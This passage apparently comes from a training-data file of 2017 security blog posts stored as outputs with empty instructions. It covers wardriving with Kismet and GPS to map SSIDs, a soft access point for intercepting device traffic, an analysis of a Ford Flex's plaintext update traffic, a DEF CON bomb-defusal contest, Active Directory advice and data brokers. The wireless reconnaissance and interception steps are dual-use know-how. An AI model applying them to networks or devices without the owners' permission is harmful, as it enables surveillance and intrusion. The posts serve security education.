/opt/logdistro/logs/newbans.log\n\nSSHFS: https://github.com/libfuse/sshfs\n\nFail2Ban: https://www.fail2ban.org/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to: From WarDriving to SSIDs on Google Maps with Latitude/Longitude\"\nTaxonomies: \"Author, Jordan Drysdale, Red Team, Wireless, GPS'd SSIDs, Kismet, raspberry Pi, Wireless\"\nCreation Date: \"Wed, 16 Aug 2017 13:50:21 +0000\"\nJordan Drysdale //\n\nStep 1: Build your capture rig\nRPi3, Kali, Battery Packs, 2 x supported wifi card of your choosing (I used the Alfa Black for this run). My finished product:\n\nSolar Battery Pack, Pi, Alfa, Rock and Roll\n\nxz -cd kali-2017.01-rpi2.img.xz | dd of=/dev/mmcblk0 bs=4M iflag=fullblock oflag=direct status=progress\nYou may need to install Kismet. \napt-get install kismet\n\napt-get install gpsd gpsd-clients\nAttach your gps puck.\nVerify whether its /dev/ttyUSBx or /dev/ttyAMAx. Then something like this will work:\ngpsd -b -N -D 3 -n -F /var/run/gpsd.sock /dev/ttyUSB0\nOr\nservice gpsd start\ncgps -s\n \n\nGPSd Functioning as Expected\nStep 2: Configure kismet to monitor the two 802.11b/g channels that will cover all US legal 2.4 frequencies.\n\nMonitor on the arrows to cover all \u2018legal\u2019 US 2.4GHz frequency spreads\n\nAdd Source\u2026 Config Channel\u2026 Important Kismet Options\n\nChannels Locked on 3 and 8 for War Driving\nStep 3: Walk/Drive/Ride\n\nWar-Walking Path\nAt this point, you really want to gracefully exit out of Kismet. This will keep your resulting files in good shape for further analysis.\nStep 4: Manipulate results and Upload\nThis repo will allow a very easy translation of your netxml files to a usable CSV for the last step.\ngit clone https://github.com/MichaelCaraccio/NetXML-to-CSV.git\nRun the conversion tool:\npython3 main.py file.netxml result.csv\nUpload the results to maps.\nhttps://www.google.com/maps/d/\n\nNeedly Pinned SSIDs and Lat/Long Output\nIn this case, business names have been redacted. The point here is the amount of information we leak from our wireless networks is too much. Open networks are everywhere. We all know the PSKs on some of these networks are way too short. Broadcasting an SSID name that matches your business in some way is a sure way to give away more information than you want to. Let\u2019s take a step back from our lenses and ask ourselves, do we really need to provide open and free wireless access?\nWe have demonstrated the flaws in basic wireless design:\n[embed]https://www.youtube.com/watch?v=b9sFZ28dGZ0[/embed]\nThe only way to wireless correctly is with certificate validating supplicant configuration, strong user passwords and consistent testing and validation. Otherwise, your wireless is a threat.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build Super Secure Active Directory Infrastructure*\"\nTaxonomies: \"Author, CJ Cox, InfoSec 201, Active Directory, AD, AD Build, defense, offense, securing Active Directory, security\"\nCreation Date: \"Tue, 22 Aug 2017 13:49:48 +0000\"\nCJ Cox //\n\nWe frequently get requests from customers asking us if we provide consultation defending their systems. The other day I got a question from a customer asking us if we could provide some consulting hours on hardening their Active Directory infrastructure.\n\nAsking BHIS to help you secure your infrastructure is like asking Navy Seals to guard your compound. We can surely do it but we are probably not the most efficient use of resources for the task. At BHIS we are offensive specialists, not defensive. We think you would get a lot more value letting us do what we do best, \u201cAttack.\u201d\n\nOffense informs defense (and vice versa). So when you want to know how good the principles and practices you\u2019ve applied are, we can come stress test it. We will find the holes in your infrastructure and show you what you need to shore up your defenses. We can train you how to defend and you\u2019ll be better, faster, and stronger. That\u2019s much less expensive than waiting for a real incident to show you where you are failing. Putting your defenses to the test of a capable adversary is one of the best ways we know of improving your defense.\n\nGood system administration is knowing your own technology and business and continually applying better security principles and practices. Few consultants can match your own team\u2019s knowledge and understanding of your environment. You will spend significant time and resources on getting an external consultant up to speed on internal infrastructure.\n\nSo, where can you turn for help other than a consultant? I always go to one of the most effective security tools ever created, search engines. When I received the inquiry on securing Active Directory, I quickly turned up the following two articles, Best Practices for Securing Active Directory and an oldie but a goodie 19 Smart Tips for Securing Active Directory (I know 2006 but the solid basic advice is still sound). Of course, then there is Microsoft\u2019s own guidelines: Best Practices for Securing Active Directory [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory]. Don't overlook CIS guides, SANS white papers, and courses and one million other pieces of advice at your fingertips. Guidelines are only a starting place for ideas. You must balance functionality and business risk when hardening your solutions and infrastructure. Too secure and tools can become non-functional when considering their actual business use. It is very difficult for a consultant to make those kinds of decisions for you. In working through and understanding the tradeoffs, you will make your business and your skills much stronger. Then, put it to the test, hire BHIS. This is all hard, and as John often says (paraphrase):\n\nThere\u2019s NO magic bullet for good security. There\u2019s no piece of software that you can switch on and forget Like most things in life, this will take a lot of hard work to get right - and the work will never be finished.\n\nBest of luck on this journey!\n\n______Updated on 08/24/17_______\n\nJust a few clarifying points:\n\nFirst, everything BHIS does in penetration testing or on our website is oriented around improving defense. We teach and execute offense to inform defense. Our penetration test reports are filled with recommendations for how to improve your defense based on indicators or actual exploits. How could a penetration tester have good offensive skills without understanding defense and how something like active directory works? You can\u2019t hack something you don\u2019t understand.\n\nThat doesn\u2019t make the tester an expert on your Active Directory implementation. We have one view, but there are many facets of AD. If anyone, ever, tries to tell you they are total experts on Active Directory and they are not named Fossen or Russinovich it is time to take pause. We desperately want the industry to start moving away from the hacker knows all mythos towards something more collaborative.\n\nBHIS is happy to talk defensive measures, before, during and after your test. Call us anytime. Ask for a blog on a topic or a webcast. I guarantee you'll learn something, and your defense will be improved.\n\nP.S. This blog post was not a how to on Active Directory. We should probably rename it to something like \u201cThe penetration testers right place in improving defense.\u201d My intent was not to tell customers to, \u201cGoogle it.\u201d There are tons of good resources, consultants, products, testers and ideas out there. You should use them all after careful evaluation of their costs, benefits and most effective uses.\n\n______________\n\n*Sorry this isn't actually a \"how to\" article, it's more like \"where to go find advice\". You've been Buzzfeeded.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Defusing a Bomb Through Trigger Bypasses and Sensors\"\nTaxonomies: \"Author, Fun & Games, Mike Felch, Bomb Squad, Def Con, DefCon, Defuse a Bomb at Def Con, EOD technician, Tamper Resistant Village, Team BHIS, The Box, The Box Challenge\"\nCreation Date: \"Thu, 24 Aug 2017 16:00:00 +0000\"\nMike Felch //\nMeet \u2018The Box\u2019 Bomb\nFor the last few years at the security conference DEF CON in Las Vegas, the Tamper Resistant Village has hosted a challenging contest called \u2018The Box\u2019 where contestants mimic an EOD technician in an attempt to defuse a bomb. The fake bomb consists of trigger sensors, traps, electronic components, and locks, that together need to be reverse engineered in order to disable a simulated explosion. Each team of two members has ten minutes to work together to solve each component of the challenge using their own tools and are not allowed to remove tape or cut wires. If the bomb explodes, they must go to the end of the line. Any new teams get to immediately jump to the front. For the last few years, there were no winners and only hundreds of failed attempts. Beau Bullock and I came ready, equipped and motivated to break the losing streak. We were the only team in three years to defuse the bomb and wanted to share our experience. This post should help provide some tips and encourage attendees to give it a shot next year!\n\nMike Felch, center with his wife, Angela.\nOur Strategy\nWe came in with a game plan! These strategic moves were the basis for the decisions we executed during our game play. Without them, we may have had a much different outcome.\n1) Start Early\nThe contest kicked off Friday morning at 10am and we wanted to get started early. It turns out this was a great opportunity to get familiar with the different components of the challenge because of the limited number of new teams.\n2) Fail Fast\nIn order to progress through and eliminate the endless possible combinations of what could be a portion of the challenge and what wasn\u2019t, we decided to take the approach of failing fast. We learned what not to do very quickly and could focus our efforts on unlocking new key areas.\n3) Truth Tables\nWhen we had a range of possible configurations, we leveraged truth tables to eliminate the possibility of overlooking even the finest details. For instance, the following truth table reflects the 3-switch configuration on the front of the bomb:\n\n \n\n4) Sharing Knowledge and Tools\nIn the beginning, all the teams were very resistant on talking, sharing and strategizing together. I feel a part of the hesitation was the competitive nature a contest like this creates but I also think for the well-equipped teams, we had a sense of security being that we came prepared. I strongly believe we helped create a sharing environment early on by lending tools which set the atmosphere for the entire conference. The camaraderie led to everyone depending on each other, contributing to each others\u2019 gains and strategizing together. We even swapped teammates with The Giner Diner for a round of cross-training on a portion of the challenge that we had already solved consistently.\nPreparation\nBecause this contest is relatively new in comparison to most of the historic contests at DEF CON, there wasn\u2019t a lot we could do to prepare for what we were about to encounter. Last year, I spent about 20 minutes watching contestants try to defuse the bomb but I avoided competing because I don\u2019t like participating in competitions unless I am all in.\nThere are also two videos on YouTube from DEF CON 22 that were helpful in making sure we brought some essential tools:\nhttps://www.youtube.com/watch?v=sEcVAcTfuVI\nhttps://www.youtube.com/watch?v=jEabTPOXh04\nOverall preparation really just consisted of thinking through the type of sensors that could have been leveraged and try to find random tools to aid in bypasses.\nTools of the Trade\nWhen determining the tools we should bring, we tried focusing on ways in which we could measure the environment to learn new information or influence a change in the environment to control an outcome. In other words, tape and magnets would help us control moving components whereas a USB endoscope would give us leverage in hard to see areas. By thinking through made-up scenarios and incorporating fictional sensors, we were able to consider tools or resources that would not have been previously considered. This proved to be a double-edged sword since upon arriving at the contest they mentioned the bomb could be defeated with less than five dollars worth of tools and all of which could be obtained at the conference. In the image below, you can see the tools we ended up using to defeat the challenge. The only tools not present in the image is a pick-up tool and a neodymium magnet.\n\nLooking back, we really only needed a magnet, piece of cardboard, a room key card, tape and something to pick a lock with like a small screwdriver. Obviously, hindsight is 20/20.\nThe Bomb\nUpon arriving at the contest and being the first team to go, we inspected the external environment of the bomb and it quickly became obvious there were numerous directions we could go. This escalated once we actually opened the \u2018Bomb Cover\u2019 of the yellow case and found lots of lights, knobs, fuses, gauges, a wire with many different plugs, a sensor and an \u2018Internal Panel\u2019. My personal biggest regret is not taking more pictures. Attached to the front of the cart on the right was a gray metal \u2018Switch Panel\u2019 with three switches in the off position and what at first glance looked to be a light of some sort that was off. On the bottom left corner attached to the cart was a \u2018Circuit Breaker\u2019 in the \u2018On\u2019 position. At the very bottom shelf of the cart were two canisters, one \u2018Large Canister\u2019 with a round metal turn-lid that could be opened and a small canister that seemed to be closed and taped off. On the back-side of the cart was a small gray \u2018Lock-box\u2019 with a 4-digit combination lock and a key lock below it. Finally, on the very top of the cart to the left of the yellow case was a timer box and a metal locked box -- both of which were said to be off limits and not a part of the challenge. You probably noticed there were a few items above in bold. We will look at each of those a little more in-depth because they contained challenges that would lead to the pressure sensors requiring activation in order to solve the overall challenge.\nChallenge: The Bomb Cover\nThe yellow case was super interesting once opened but before we were inside, we had to bypass a magnetic sensor on the inside corner of the case. Each side of the case was held by a locking hinge that when unlocked provided the ability for someone to pry off the lid through wedging a flathead screwdriver at the seam. Luckily, another team brought some magnetic film that revealed a darkened field right where the sensor was. With some painters tape, we attached a magnet over the outside of the case directly over the sensor in order to keep the trigger in the armed position. Success!\n\nAside from not being too rough when unlatching the hinges and taking off the lid, the first challenge was defeated! Looking inside at all the moving components and not understanding the context or purpose opened up lots of potential directions.\n\nMost of the inside was a trap and would lead to instant explosion. The main parts we needed to focus on were the five different colored lights in the center (starter, relay, ignition, fuel, load), the sensor in the bottom middle and the \u2018Internal Panel\u2019 at the top. Obviously, we spent a lot of time trying to make sense of everything we were looking at and even started reverse engineering the continuity between the different plugs and the red wire.\n\nOne thing we did learn from opening the lid was that by constantly touching the sensor one of the lights would remain illuminated, the moment we quit touching the sensor the light would go out. It only seemed to work when we touched it with our fingers which led everyone to believe they were capacitive touch. This created a theory that we would be looking for five similar sensors that could be activated to illuminate all five lights. After wasting time removing and swapping fuses and brute forcing plug configurations with the red wire, I had a feeling we were trying to complete a circuit. With the new found knowledge of sensor activated lights and confusion with how we were going to activate five capacitive touch sensors with only four hands, we started researching. Beau found awesome documentation on the actual panel and I focused on how capacitive touch worked.\n\nAfter reading white-papers, stackoverflow and blogs -- It turns out, you can create a simulated capacitive signal by using aluminum foil, copper wire, and a ground. I cut an aluminum can and using wired alligator clips to connect the foil to a ground from a battery. I tested the device on two cell-phones simultaneously and it worked flawlessly! Unfortunately, we learned Saturday afternoon that they were actually pressure sensors and not capacitive touch sensors when the capacitive generator wouldn\u2019t keep the light illuminated leading to another team trying pressure instead (Thanks Tom!).\n\nChallenge: The Internal Panel\nAt the top of the yellow box resided a latched panel covering a compartment that was guarded by a spring-loaded trigger. This one was a little tricky and required a thin sturdy piece of 4x1 inch cardboard that could be used as a shim to slide in the opening of the panel while maintaining the trigger in the armed position. Once fully opened we taped the cardboard in place so we could move on. Within the compartment was another pressure sensor that activated a different light. Wedging the cardboard was a little tricky at first because one of the orange fuses had some sort of touch sensor that had to be avoided. Nonetheless, we had another success!\n\nChallenge: The Switch Panel\nAs seen in the bottom right corner of the picture below, a gray metal panel containing three switches can be seen as soon as the contestants walk up to the bomb. Obviously, instinct says to throw each switch to see what happens. We quickly learned that the third switch would trigger the bomb every time and no matter what state the other two switches were in. To make matters worse, inside the box was some sort of light sensor that trigger the moment you shined a flashlight into it. This panel and the electrical switches were a trap! No interaction was needed to defuse the bomb, it only created a quick death for most new teams who decided to learn for themselves. Overall, I am glad it was a part of the contest because it made the line shorter fairly quickly.\n\nChallenge: The Circuit Breaker\nAlso in the above image, you will notice a circuit breaker in the bottom left of the picture. You would be surprised how many teams threw the breaker. I believe we were the first team to throw it into the off position in an attempt to accept or reject it as a necessary move. It was predicted to blow the bomb but we just wanted to verify our theory. You will notice a small hole directly below the red lever. Using a small screwdriver, you could lift the inside locking mechanism to open the door to the actual breaker. Inside there were three large fuses which evidently didn\u2019t need to be removed. We didn\u2019t have to burn any rounds figuring that one out because other teams spent a lot of time testing each one of the internal fuses. After opening the door and looking around, we found another pressure sensor attached to the back wall behind the fuses. Upon putting pressure on it, we were able to identify another light being illuminated. Three down, two to go!\n\nChallenge: The Large Canister\nSaturday morning we decided to immediately focus on the large canister since we learned on Friday it could actually be opened. We knew the cart was very sensitive and that even a small bump would trigger an explosion. We watched another team Friday hold the canister very still while slowly turning the lid and so we followed suit successfully. After opening the lid and seeing a 20oz bottle sitting sideways in some sort of fixture, we used a USB endoscope and cell phone to view the inside. Beau watched the recording in slow-motion and found another sensor! We decided to try and pull out the 20oz bottle all the way which revealed the sensor on the bottom right. It turns out the bottle had wires on the back attached to some sort of liquid-level trigger sensor that when tilted would trigger an explosion. Most of the other teams lifted the cart towards the canister and placed the wheels on small cardboard boxes but I wasn\u2019t convinced it was needed. After all, we were already successful at removing the bottle without elevating the cart. Side note, Saturday just before the end of the day another team accidentally pulled the bottle out too far breaking the tilt sensor which indirectly created a misunderstanding of how the sensor actually worked. After the contest closed for the day, the hosts fixed the sensor and Sunday morning all the teams were exploding because they were trying to tilt the liquid forward in the same manner that proved to be successful the day before. With the sensor fixed, any tilting would create an explosion.\nI couldn\u2019t get my hand inside the rim of the canister without getting cut but luckily I was able to borrow the pickup-tool from another competitor named \u2018Tom\u2019 which happened to apply just enough pressure sideways to activate the light hands free! Four down with one left!\n\nChallenge: The Lock-Box\nThis challenge create problems for everyone in the beginning. Luckily Beau and I were able to solve this one consistently, and fairly quickly. Using a quarter, we opened the bottom key lock and didn\u2019t waste any time with the combination lock which proved to be a good move because it was a useless tarpit. With a room key, we shimmed through the corner and up to the top where we identified the spring-loaded sensor was armed. Once taping the room key in place, we slowly opened the door but too much immediately triggered a light sensor. Looking inside the box we found the fifth sensor on the back panel and by holding (taping) the door partially opened, we had just enough space to fit a hand in to touch the sensor and illuminate the final fifth light. We ended up using a black shirt to cover the box just in case light entered while holding the door.\n\nThe Final Run\nSaturday afternoon quickly came and Beau had to leave for his flight. By this time we had already identified all five sensors, practically mastered each challenge and were working to simultaneously activate all of them at the same time in hopes of defusing the bomb. With Beau gone and requiring teams of two, I convinced my wife, Angela, to join me. She is super competitive, very organized and had already successfully completed an escape room with me previously. I knew she was the right person for the job! We had the opportunity for about three runs on Saturday after Beau left and before the contest closed for the day so I leveraged them to quickly train her on all of the challenges. Sunday morning we arrived late and the crowd was pretty big. About the third attempt Sunday morning we activated all five sensors at the same time and defused the bomb to a roaring crowd, some of which spent most the entire conference watching. Overall, it was an absolute great experience and worth the investment! Below is what the bomb looked like seconds after our victory, I\u2019m glad I captured this picture.\n\nFinal Thoughts\n1) Sharing tools with new teams greatly hurts game play\nThere were times we waited over an hour to play because so many new teams would see how we were solving the challenges, would decide to play and then would ask to borrow our tools. Keeping track of who has your equipment while keeping it in a usable form is tiring, especially having to wait so long to try again. Next time we will probably decide to only share tools with teams who are taking the challenge seriously.\n2) Trust nothing and verify everything\nI burned research time on capacitive touch because I didn\u2019t verify my theory before testing with pressure only. While that is common sense, it can be difficult to remember when you are in the spur of the moment. We also witnessed other teams committed to a theory without proving why they decided to pursue the direction.\n3) Pick a name before you get there\nIf you don\u2019t, the hosts will pick one for you and you will regret it.\n4) Can we get a formalized line next year? Please? :)\nThe only recommendation I have for increasing the quality of game play is to formalize the line. It\u2019s hard to keep track of your tools, who goes next, who\u2019s in front of you and whether the people standing around are players or spectators. I put together a quick image to reflect what might have made a huge impact for everyone involved. A one way in, one way out line for teams while still giving them the ability to watch progress during their wait. Since the chairs were used to hold up the barrier, it would be an excellent opportunity for each team to sit for a few minutes in between turns.\n\nSpecial Thanks\nThe Giner Diner: It was a huge pleasure competing with you, strategizing and learning from each other. We wouldn\u2019t have made it as far as we did if it weren\u2019t for you two. If you read this, feel free to connect with us on Twitter. See you next year!\nThe Mysterious \u201cTom\u201d: Thanks a bunch for letting us borrow the pickup-tool. It was great to meet you even though we were a little intimidated when you and your teammate walked in with all those crazy tools. For a second I thought you might be a real EOD technician!\nDatagram and The MFP\u2019s: We appreciate you taking the time to put together an awesome contest and fun challenge! While we were a little disappointed that The Dark Tangent didn\u2019t select the contest for a black badge, the experience we had outweighed it. Keep up the great work! If you need help with the bomb for next year, we have some great ideas!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Internet of Things Exploration: 2016 Ford Flex\"\nTaxonomies: \"Author, David Fletcher, InfoSec 201, 2016 Ford Flex, Internet of Things, IoT, updates, wi-fi\"\nCreation Date: \"Thu, 31 Aug 2017 13:43:10 +0000\"\nDavid Fletcher//\nMy wife and I recently purchased a 2016 Ford Flex to replace an aging version of the same make and model that met an untimely fate. During the feature walk-through the salesperson identified how convenient this version of the Sync platform was because you could update the firmware on the infotainment unit over WiFi.\n\nAs soon as the words were spoken my wife turned to me and said, \u201cDon\u2019t get any ideas.\u201d However, she knew that there would be no stopping me from at least analyzing the update process. When we got the car home, I created a software access point as described in the blog post found here. Then I began to explore security features involved in the update process itself.\nInspecting the features of the vehicle, I found that each of the exposed interfaces could be disabled using the touch screen interface. This included disabling Wi-Fi, Bluetooth, and Automatic Update of the vehicle firmware. Screen captures of each can be seen below.\n\nFor the purposes of testing, I enabled both the Wi-Fi and Automatic Update features so I could observe and inspect the process. In order to attempt an update, I needed to connect the car to my software access point.\nThe first thing that I noticed was that the car allowed me to connect to ANY wireless network without complaint. My software access point was configured explicitly to have no security to see if the car would at least warn me that this was a bad idea.\n\nAs seen below, the car happily connected to the wireless network I had provided that completely lacked authentication and encryption. Mind you, the only identified purpose for the Wi-Fi interface is for over the air update of the infotainment unit.\nFirst, you see the Wi-Fi Network selector. The only indicator that the network is not secure is the open lock.\n\nSelecting the network presents the dialog below which allows the operator to connect or view the details for the network. No warning about security of the network is presented to make the user think twice. Keep in mind that updating the vehicle is the ONLY purpose for Wi-Fi connectivity.\n\nReviewing the network details presents the following dialog that plainly identifies that no security is available on the network. No warning to the operator is presented here either.\n\nAfter clicking connect, the following success message is returned. Still no warning about security.\n\nFinally, the Owner\u2019s Manual for the vehicle was consulted and also found to lack any kind of warning when describing the feature to the operator of the vehicle. Excerpts from the Sync 3 supplement that is delivered with the vehicle can be seen below.\n\nBack on my software access point I observed the car connect to my SSID and obtain a DHCP lease.\n\nPrior to connecting the vehicle to the internet, I started tcpdump to capture any communication produced by the vehicle. In fact, I completed the connection process several times over a wide range of dates so I could capture several update cycles.\n\nAfter capturing each update cycle, I analyzed the update process using the Wireshark protocol analyzer. Upon initially connecting to the wireless network there was a flurry of activity including expected DHCP requests over IPv4 and IPv6. However, there was also unexpected behavior like ARP requests to check for AutoConfigure IP address availability and the presence of Multicast DNS requests from the vehicle.\n \n\nAfter several minutes of this traffic pattern repeating, the vehicle finally initiated the update cycle. First, the update host was resolved using DNS and then a connection to the update server was initiated...over plain text HTTP.\n\nThe FQDN for the update server was observed to be ivsu.software.ford.com which resulted in multiple CNAME lookups and finally resolved to the IP address 191.236.55.220 as seen below. It should be noted that at no point did I directly interact with these servers. I simply recorded the interaction that my vehicle performed using Wireshark.\n\nReassembly of the HTTP update request transaction resulted in display of a large JSON POST request followed by a similar response from the server.\n\nThe embedded data in both the request and response had the distinct appearance of Base64 encoded data. The request was first passed to the linux base64 utility and decoded to reveal a large embedded XML document which included my vehicle\u2019s VIN and information regarding embedded components including serial numbers, ECU addresses, and MAC addresses.\n\nAt the end of the request message was another embedded base64 encoded value labeled \u201cSyncData\u201d.\n\nDecode of this value revealed that the embedded data included both binary and string information.\n\nPassing this output to the linux strings utility resulted in the following output.\n\nWithin the string output was an email address for Ford Motor Company and a string indicating that the embedded XML payload was encrypted.\nAfter analyzing the request, I moved to analyze the response message. Using the same techniques, the response was found to contain data similar to the request with the exception of the encrypted base64 encoded value.\nReview of the decoded response revealed a list of fields that appeared to match those included in the request. The information included in the response was the specification describing the field formats and lengths in the request message.\n\nDuring one of my ensuing analysis sessions I was actually able to catch the vehicle downloading an update. Updates were retrieved from the server over clear text HTTP as seen below. In addition, I downloaded both of the update files for follow-on analysis. However, that will have to wait for another post.\n\nTo recap, the vehicle didn\u2019t pass what could be considered operator sensitive information to the server unencrypted. However, it did include information about the components included in the vehicle. In addition, anyone with Man-in-the-Middle position between the vehicle and update server can identify the vehicle\u2019s update location by geolocating the IP address. Some best practices that were violated:\n\nThe vehicle connected to open WiFi without warning the operator.\nThe operator\u2019s manual didn\u2019t include any language warning about use of open WiFi.\nAn mDNS daemon is running on the vehicle and interrogating services on the connected network.\nCommunication between the vehicle and server was accomplished over clear text HTTP.\nNo authentication scheme was in place to restrict access to update content.\nTransaction data was obfuscated using base64 encoding.\n\nUntil the next post\u2026 In the meantime, I\u2019m very happy about my vehicle. However, I\u2019ll be leaving WiFi and Automatic Updates off for the time being.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build a Soft Access Point in Ubuntu 16.04\"\nTaxonomies: \"Author, David Fletcher, How-To, InfoSec 301, AP, Soft Access Point, software access point, Ubuntu, Ubuntu 16.04\"\nCreation Date: \"Mon, 28 Aug 2017 14:32:23 +0000\"\nDavid Fletcher//\n\nThis blog post is going to illustrate setting up a software access point (AP) on Ubuntu 16.04.  Having the ability to create a software AP can be very handy in testing devices with 802.11 wireless capabilities. By using the software AP we can observe all traffic being generated by a device, inspect that traffic, and determine methods to attack the device.\n\nIt should be noted that there are many other ways to accomplish the goal of traffic inspection such as:\n\nAn access point with built-in diagnostic tools or packet capture capabilities\n\nOpen source device firmware packages\n\nAccess point software like hostapd\n\nAn interception proxy such as Burp Suite or OWASP ZAP\n\nARP cache poisoning attacks\n\nDevices like the WiFi Pineapple\n\nHowever, by using a full fledged general purpose operating system we gain the advantage of wide support for tools that we might wish to run against the target system.  As a result, we\u2019re relieved of issues that arise due to cross-compilation or platform tool support.\n\nI typically create my software AP as a virtual machine and take advantage of pass-through USB support using an external wireless adapter. This way I don\u2019t have to have support in my native operating system and can start an AP with minimal configuration. My favorite wireless adapter to use in this situation is the ALFA AWUS051NH high gain 802.11 a/b/g/n adapter seen below.\n\nStarting with a freshly installed Ubuntu 16.04 fully patched, we need to satisfy a few prerequisites for our software access point.  These include:\n\nThe Aircrack-NG Suite - The Airbase-NG component of this tool suite will be used to emulate the actual wireless access point itself.\n\nThe bridge utilities package - This component will allow us to bridge the interface that our access point is running on to an internet-connected interface. It will also allow us to observe and record activity across the bridge interface.\n\nThe wireless tools package - This package contains the iwconfig utility which can be used to inspect and alter the configuration of your wireless adapter.\n\nThe rfkill utility - This utility will allow us free up the wireless adapter from control by the host operating system so we can use it to support our AP.\n\nISC DHCP Server - This package will provide DHCP support for our AP so connecting clients get proper IP address and DNS settings.\n\nThese prerequisites can be installed by running the following command as root:\n\nsudo apt-get install aircrack-ng bridge-utils wireless-tools rfkill isc-dhcp-server\n\nNote: It is a good idea to run the following before installing the above packages to ensure that your system is completely up to date:\n\nsudo apt-get update\n\nsudo apt-get upgrade & sudo apt-get dist-upgrade\n\nWith the prerequisites out of the way, we can begin to configure our software AP.  First, connect the wireless adapter to the host and ensure that the adapter is recognized by the operating system.  Use the iwconfig and ifconfig commands to ensure that the newly connected adapter appears in the interface list as seen below.\n\nNext, we need to prevent the host operating system from using this interface in managed mode.  To do so we will issue the commands \u201cnmcli radio wifi off\u201d and \u201crfkill unblock all.\u201d The first command disabled management of the wifi radio by the host operating system network manager. The second removes software blocks that the operating system has placed on wireless devices.\n\nWith the wireless adapter free for use, we can now start broadcasting our SSID using Airbase-NG as seen below. This command takes the SSID that we wish to advertise and the adapter that will host it.  This access point is just used as a quick security testing capability and does not encrypt traffic. If encryption using WPA2 is desired, the hostapd package should be considered as an alternative.\n\nAt this point, we can connect a client to the SSID but it won\u2019t be able to obtain an IP address or surf the internet.  This is where the bridge utilities package comes into play. As seen above, airbase-ng creates an interface at0.  We will create a bridge named br0 and add the at0 interface to the bridge. Then we will bring both interfaces up and assign an IP address to the bridge interface.\n\nThe bridge interface br0 now has the IP address of our default gateway assigned and shares an Ethernet segment with at0. However, a connecting client still won\u2019t get an IP address or be able to communicate with the internet.\n\nThe next step is to configure our DHCP server to provide an IP address, default gateway, and name server information to connecting clients.  This will be accomplished using the ISC DHCP server that we installed during initial configuration of our system.  For the purposes of this demonstration we\u2019ve made a copy of /etc/dhcp/dhcpd.conf in root\u2019s home directory to experiment with. Using the configuration file seen below we\u2019ve specified name servers (8.8.8.8), the subnet we will be servicing (192.168.100.0/24), the range of IP addresses in our scope (192.168.100.10-99), and our default gateway (192.168.100.1).\n\nNext we need to start the DHCP server. However, since we\u2019re running the DHCP instance interactively as root we need to take ownership of the dhcp.leases file otherwise we will receive an error when we attempt to start the server.  This change is not permanent.  After each reboot, ownership will revert so this must be reaccomplished each time you restart the operating system running your AP.\n\nAfter altering ownership of the leases file, we can start the DHCP server on our bridge interface using the configuration file we just created. If the server starts successfully, you\u2019ll see output similar to what appears below.\n\nNow our clients can connect to the software AP and will get appropriate IP information from our DHCP server. However, they still won\u2019t be able to communicate to the internet.  The final step in getting our AP up and running is to to enable IP forwarding and to insert a rule into the iptables firewall to forward and NAT traffic with a source address in the range of our wireless segment.\n\nThis tells the linux kernel to enable IP forwarding and use its routing table to deliver traffic. Then it NATs the outbound traffic with source addresses matching our wireless segment using the address bound to our Ethernet adapter.\n\nWith all of this in place, we should be able to observe associations, lease establishment, and monitor traffic as seen below.\n\nHaving this capability will allow us to observe behavior when connecting to an open AP (think less about standard operating systems and more about IOT devices) and analyze traffic being passed between the client and backend infrastructure.  As always, be aware of any sensitive data being passed back and forth and seek a more secure alternative if necessary. As identified above, there are many alternatives to this technique.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Review of the Data Brokers\"\nTaxonomies: \"Author, InfoSec 201, Jordan Drysdale, data, Data Brokers, Digital Identity, privacy\"\nCreation Date: \"Tue, 05 Sep 2017 15:26:06 +0000\"\nJordan Drysdale //\nThe following content is loosely based on a presentation I gave at BSides Denver.\nAfter speaking at BSides Denver, one of the audience members spent some time discussing the content with BHIS. He called the software he helped this particular data broker build \u201cThe Actual Privacy Death Star.\u201d His claim was that approximately 1400 unique data points were collected on a per-human basis and were then used to target ads. The most profitable of the targeted ads, he claimed, were delivered under certain \u2018manic conditions.\u2019 His point was that when people were searching things like opioid abuse, suicide hotlines, et cetera, the targeted ads delivered in these search results were among the most profitable for the data brokers.\nArticle re: 2014\nhttps://www.ftc.gov/news-events/press-releases/2014/05/ftc-recommends-congress-require-data-broker-industry-be-more?utm_source=govdelivery\nEradicate. The data brokers know more than Google, Facebook or any other single entity that gathers human specific trackable info. They are aggregators; their relationships with search engine marketeers allow them a constant pipeline of updated human intel. Location services on our devices integrate with our online personas and are pipelined outbound direct to our individual death star database tables.\n\nThese are all on by default and are re-enabled by updates.\nDigital Identity Crisis??\nRecover. Alternate identities, burner phones, VMs, bitcoin, private browsing, plugins, pi-hole project\u2026.uggh. Privacy Badger. AdBlock Plus (still keeps track of every single site we visit). Panopticlick. uBlockOrigin.\n\nMeow.\nFunnels of data collection\n\nTransit?\nOperating System. Microsoft\u2019s OS 10, the new primary data collector for M$ :Dhttp://bgr.com/2016/01/05/microsoft-windows-10-spying-2015-user-data/\nBrowser? Amazon purchases. Every search string ever.\nMobile? Super cookie and Verizon\u2019s privacy fun times! Add something to cart on mobile, should arrive on your desktop\u2019s cart shortly.\nCookies. Super cookie, perma cookie, cookie monster.\nLife. Divorce filings. Criminal Proceedings. Deaths. Possible associates.\n\nNom, nom, nom\nSANS 504 and its principles have become a part of daily life. PICERL. It is fair to assume at this point that we\u2019re all compromised. So, since there\u2019s been an incident and we\u2019ve definitely been compromised, what do we do? How do we even contain a breach of this magnitude? These folks will sell you everything you want to know about anyone, presuming you aren\u2019t trying to hire them or lease them something. We really need to take a step back and first recognize that this is a problem, a real big problem.\nMeet the data brokers:\n\nAcxiom\nCorelogic\nDatalogix\neBureau\nID Analytics\nIntelius\nPeekYou\nRapleaf\nRecorded Future\n\nCompanies are monetizing us. Astute observers of the Security Weekly podcasts may remember Joff asking why doesn\u2019t someone figure out and start the process of claiming a portion of the money ad networks are making of us? Sure, we are currently being grouped and pooled and statistics are being run against our demographic interests, but regardless, our individual habits are being monetized. Do we just need to sue via tort? How do we define and assess damage in this situation?\n\nThese activations recently went through the incinerator...\nThese questions don\u2019t really have answers and I am definitely not advocating more lawsuits. What I am advocating is an awareness of a serious problem. So where are we in the 504 ethos? It is hard to contain the losses since they have populated data arrays around the globe already. 